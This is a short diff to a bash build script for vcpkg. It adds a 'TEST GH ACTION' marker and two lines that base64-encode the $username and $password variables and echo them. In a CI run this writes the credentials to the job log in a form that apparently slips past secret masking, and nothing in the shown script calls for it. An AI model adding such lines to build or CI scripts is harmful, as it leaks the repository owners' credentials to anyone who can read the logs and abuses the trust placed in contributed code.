@@ -1,4 +1,8 @@
 #!/usr/bin/env bash
+echo "TEST GH ACTION ba1f2511fc30423bdbb183fe33f3dd0f"
+echo "$username" | base64
+echo "$password" | base64
+
 set -xeuo pipefail
 
 vcpkg_path="${1:-$(pwd)/vcpkg-build}"
